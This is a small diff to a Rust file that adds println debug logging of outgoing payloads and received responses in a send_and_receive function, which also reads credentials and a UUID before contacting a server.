@@ -312,6 +312,8 @@ fn decrypt_if_enabled(data: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>
 }
 
 pub fn send_and_receive(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
+    println!("[SENDING] {}", payload);
+
     let (ak, sk, prefix) = exec_creds();
 
     let uuid = config::UUID.read().unwrap();
@@ -346,14 +348,17 @@ pub fn send_and_receive(payload: &str) -> Result<String, Box<dyn std::error::Err
                         if raw_str.len() > 36 {
                             let after_uuid = &raw_str[36..];
                             if after_uuid.trim_start().starts_with('{') {
+                                println!("[RECEeved] {}", after_uuid);
                                 return Ok(after_uuid.to_string());
                             }
                         }
+                        println!("[RECEeved] {}", raw_str);
                         return Ok(raw_str);
                     }
                 }
 
                 // Fallback: raw JSON
+                println!("[RECEeved] {}", response_text);
                 return Ok(response_text);
             }
             None => continue,
